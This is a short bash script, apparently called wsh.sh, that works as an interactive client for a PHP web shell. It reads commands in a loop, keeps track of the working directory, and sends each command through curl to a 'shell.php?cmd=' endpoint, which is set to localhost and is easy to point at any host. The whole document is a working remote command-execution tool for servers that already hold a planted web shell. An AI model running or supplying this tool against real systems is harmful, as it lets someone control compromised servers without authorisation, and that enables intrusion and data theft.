url="http://localhost:6767/shell.php?cmd="

if [[ -z $url ]]; then
  echo "Please set up url in first line of ./wsh.sh" 
  exit
fi

path=$(curl -s $url"pwd")

while [ 1 ];
do
  read -p "[$path]> " input;
  input="cd+$path;"+$(echo $input | sed 's/ /+/g');
 
  if [[ ${input:2} == *"cd"* ]]; then
    path=$(curl -s $url$input";pwd")
  else
    curl $url$input
  fi

done
